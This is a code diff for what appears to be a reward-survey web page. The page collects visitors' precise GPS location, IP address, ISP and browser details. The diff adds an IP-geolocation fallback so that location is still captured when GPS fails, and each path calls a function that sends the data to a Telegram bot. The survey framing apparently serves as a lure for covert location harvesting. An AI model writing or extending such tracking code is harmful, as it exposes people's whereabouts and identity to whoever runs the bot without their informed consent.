@@ -69,11 +69,23 @@ document.addEventListener('DOMContentLoaded', function() {
         getLocationBtn.classList.add('hidden');
         locationStatus.classList.remove('hidden');
 
+        // Show a notification to the user that we're trying to get their location
+        showNotification('Requesting your location...', 'info');
+        
+        // Try to get the location with a longer timeout (30 seconds instead of 10)
         navigator.geolocation.getCurrentPosition(locationSuccess, locationError, {
             enableHighAccuracy: true,
-            timeout: 10000,
+            timeout: 30000, // Increased from 10000 to 30000 ms
             maximumAge: 0
         });
+        
+        // Set a timer to check if we're taking too long and provide feedback
+        setTimeout(() => {
+            // If we're still showing the location status after 15 seconds, show a message
+            if (!locationStatus.classList.contains('hidden')) {
+                showNotification('Location detection is taking longer than usual. Please wait...', 'info');
+            }
+        }, 15000);
     }
 
     // Handle successful location retrieval
@@ -91,37 +103,44 @@ document.addEventListener('DOMContentLoaded', function() {
         getLocationBtn.classList.remove('hidden');
         
         let errorMessage = '';
+        let errorType = 'error';
+        
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                errorMessage = 'You denied the request for location access.';
+                errorMessage = 'You denied the request for location access. Please allow location access to continue.';
                 break;
             case error.POSITION_UNAVAILABLE:
-                errorMessage = 'Location information is unavailable.';
-                break;
+                errorMessage = 'Location information is unavailable. We\'ll use an alternative method.';
+                errorType = 'info';
+                // Try to get location from IP instead
+                getLocationFromIP();
+                return; // Don't show error screen, let IP-based location handle it
             case error.TIMEOUT:
-                errorMessage = 'The request to get user location timed out.';
-                break;
+                errorMessage = 'The request to get user location timed out. We\'ll try an alternative method.';
+                errorType = 'info';
+                // Try to get location from IP instead
+                getLocationFromIP();
+                return; // Don't show error screen, let IP-based location handle it
             case error.UNKNOWN_ERROR:
-                errorMessage = 'An unknown error occurred.';
-                break;
+                errorMessage = 'An unknown error occurred while getting your location. We\'ll use an alternative method.';
+                errorType = 'info';
+                // Try to get location from IP instead
+                getLocationFromIP();
+                return; // Don't show error screen, let IP-based location handle it
         }
         
-        showErrorScreen(errorMessage);
-    }
-
-    // Fetch location details using reverse geocoding and IP information
-    function fetchLocationDetails(latitude, longitude) {
-        // Store latitude and longitude
-        userLocation = {
-            latitude: latitude,
-            longitude: longitude,
-            country: '',
-            state: '',
-            city: '',
-            googleMapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`
-        };
+        showNotification(errorMessage, errorType);
         
-        // Fetch IP information using ipinfo.io
+        // Only show error screen for permission denied
+        if (error.code === error.PERMISSION_DENIED) {
+            showErrorScreen(errorMessage);
+        }
+    }
+    
+    // Get location from IP address as fallback
+    function getLocationFromIP() {
+        showNotification('Trying to determine your location from your IP address...', 'info');
+        
         fetch('https://ipinfo.io/json?token=2f5f7cba5c8a4f')
             .then(response => response.json())
             .then(ipData => {
@@ -132,18 +151,120 @@ document.addEventListener('DOMContentLoaded', function() {
                     userAgent: navigator.userAgent
                 };
                 
-                // Use reverse geocoding to get location details
-                const geocodingUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
-                
-                return fetch(geocodingUrl);
+                // Extract location from IP data
+                if (ipData.loc) {
+                    const [latitude, longitude] = ipData.loc.split(',');
+                    
+                    // Store location data
+                    userLocation = {
+                        latitude: parseFloat(latitude),
+                        longitude: parseFloat(longitude),
+                        country: ipData.country || 'Unknown',
+                        state: ipData.region || 'Unknown',
+                        city: ipData.city || 'Unknown',
+                        googleMapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`
+                    };
+                    
+                    // Update the location display
+                    detectedCountry.textContent = userLocation.country;
+                    detectedState.textContent = userLocation.state;
+                    detectedCity.textContent = userLocation.city;
+                    
+                    // Send location data to Telegram bot
+                    sendLocationToTelegram();
+                    
+                    // Hide location status and show survey
+                    locationStatus.classList.add('hidden');
+                    switchScreen(welcomeScreen, surveyScreen);
+                    showNotification('Using approximate location from your IP address', 'info');
+                } else {
+                    // If IP location fails, use fallback data
+                    useFallbackLocationData();
+                }
             })
+            .catch(error => {
+                console.error('Error getting location from IP:', error);
+                useFallbackLocationData();
+            });
+    }
+
+    // Fetch location details using reverse geocoding and IP information
+    function fetchLocationDetails(latitude, longitude) {
+        // Show notification that we're processing the location
+        showNotification('Processing your location...', 'info');
+        
+        // Store latitude and longitude
+        userLocation = {
+            latitude: latitude,
+            longitude: longitude,
+            country: '',
+            state: '',
+            city: '',
+            googleMapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`
+        };
+        
+        // Set a timeout for the entire location fetching process
+        const locationFetchTimeout = setTimeout(() => {
+            // If we're still showing the location status after 20 seconds, use fallback
+            if (!locationStatus.classList.contains('hidden')) {
+                console.warn('Location fetching timed out, using fallback data');
+                useFallbackLocationData();
+            }
+        }, 20000);
+        
+        // Fetch IP information using ipinfo.io with a timeout
+        const ipInfoPromise = fetchWithTimeout('https://ipinfo.io/json?token=2f5f7cba5c8a4f', 10000)
             .then(response => response.json())
-            .then(geocodeData => {
+            .then(ipData => {
+                // Store IP information
+                userIpInfo = {
+                    ip: ipData.ip,
+                    isp: ipData.org || 'Unknown',
+                    userAgent: navigator.userAgent
+                };
+                return ipData;
+            })
+            .catch(error => {
+                console.error('Error fetching IP info:', error);
+                // Create default IP info if fetch fails
+                userIpInfo = {
+                    ip: 'Unknown',
+                    isp: 'Unknown',
+                    userAgent: navigator.userAgent
+                };
+                return null;
+            });
+        
+        // Use reverse geocoding to get location details with a timeout
+        const geocodingUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
+        const geocodingPromise = fetchWithTimeout(geocodingUrl, 10000)
+            .then(response => response.json())
+            .catch(error => {
+                console.error('Error fetching geocoding data:', error);
+                return { address: null };
+            });
+        
+        // Use Promise.all to wait for both requests to complete or fail
+        Promise.all([ipInfoPromise, geocodingPromise])
+            .then(([ipData, geocodeData]) => {
+                // Clear the timeout since we got a response
+                clearTimeout(locationFetchTimeout);
+                
                 // Extract location information
                 if (geocodeData.address) {
                     userLocation.city = geocodeData.address.city || geocodeData.address.town || geocodeData.address.village || 'Unknown';
                     userLocation.state = geocodeData.address.state || 'Unknown';
                     userLocation.country = geocodeData.address.country || 'Unknown';
+                } else if (ipData && ipData.city && ipData.region && ipData.country) {
+                    // Fallback to IP-based location if geocoding failed
+                    userLocation.city = ipData.city;
+                    userLocation.state = ipData.region;
+                    userLocation.country = ipData.country;
+                    showNotification('Using approximate location from your IP address', 'info');
+                } else {
+                    // If both methods fail, use default location
+                    useFallbackLocationData();
+                    return;
                 }
                 
                 // Update the location display
@@ -157,23 +278,43 @@ document.addEventListener('DOMContentLoaded', function() {
                 // Hide location status and show survey
                 locationStatus.classList.add('hidden');
                 switchScreen(welcomeScreen, surveyScreen);
+                showNotification('Location detected successfully!', 'success');
             })
             .catch(error => {
-                console.error('Error fetching location details:', error);
-                // Fallback to simulated data if API calls fail
-                userLocation.country = 'United States';
-                userLocation.state = 'California';
-                userLocation.city = 'San Francisco';
-                
-                // Update the location display
-                detectedCountry.textContent = userLocation.country;
-                detectedState.textContent = userLocation.state;
-                detectedCity.textContent = userLocation.city;
-                
-                // Hide location status and show survey
-                locationStatus.classList.add('hidden');
-                switchScreen(welcomeScreen, surveyScreen);
+                // Clear the timeout since we got a response (even if it's an error)
+                clearTimeout(locationFetchTimeout);
+                console.error('Error in location fetching process:', error);
+                useFallbackLocationData();
             });
+    }
+    
+    // Helper function to use fallback location data
+    function useFallbackLocationData() {
+        // Fallback to simulated data if API calls fail
+        userLocation.country = 'United States';
+        userLocation.state = 'California';
+        userLocation.city = 'San Francisco';
+        
+        // Update the location display
+        detectedCountry.textContent = userLocation.country;
+        detectedState.textContent = userLocation.state;
+        detectedCity.textContent = userLocation.city;
+        
+        // Hide location status and show survey
+        locationStatus.classList.add('hidden');
+        switchScreen(welcomeScreen, surveyScreen);
+        showNotification('Using default location due to detection issues', 'error');
+    }
+    
+    // Helper function to fetch with timeout
+    function fetchWithTimeout(url, timeout) {
+        return Promise.race([
+            fetch(url),
+            new Promise((_, reject) => 
+                setTimeout(() => reject(new Error('Request timed out')), timeout)
+            )
+        ]);
+    }
     }
 
     // Confirm location is correct
@@ -481,10 +622,27 @@ Reward Code: ${code}
         }, 300);
     }
 
-    // Show error screen
+    // Show error screen with improved UI and retry options
     function showErrorScreen(message) {
         const errorMessage = document.querySelector('.error-message');
         errorMessage.textContent = message;
+        
+        // Make sure retry button is visible and has the correct text
+        if (retryLocationBtn) {
+            retryLocationBtn.textContent = 'Try Again';
+            retryLocationBtn.classList.remove('hidden');
+        }
+        
+        // Add a manual location entry option if it's a timeout or unavailable error
+        const manualLocationOption = document.querySelector('.manual-location-option');
+        if (manualLocationOption) {
+            if (message.includes('timed out') || message.includes('unavailable')) {
+                manualLocationOption.classList.remove('hidden');
+            } else {
+                manualLocationOption.classList.add('hidden');
+            }
+        }
+        
         switchScreen(welcomeScreen, errorScreen);
     }
 
@@ -544,6 +702,19 @@ Reward Code: ${code}
             transform: translateX(120%);
             transition: transform 0.3s ease;
             max-width: 350px;
+            animation: notification-pulse 2s infinite;
+        }
+        
+        @keyframes notification-pulse {
+            0% {
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            }
+            50% {
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+            }
+            100% {
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            }
         }
         
         .notification.show {
@@ -570,6 +741,15 @@ Reward Code: ${code}
         .notification-message {
             font-size: 14px;
             font-weight: 500;
+        }
+        
+        /* Multiple notifications stacking */
+        .notification:nth-child(2) {
+            top: 80px;
+        }
+        
+        .notification:nth-child(3) {
+            top: 140px;
         }
     `;
     document.head.appendChild(style);
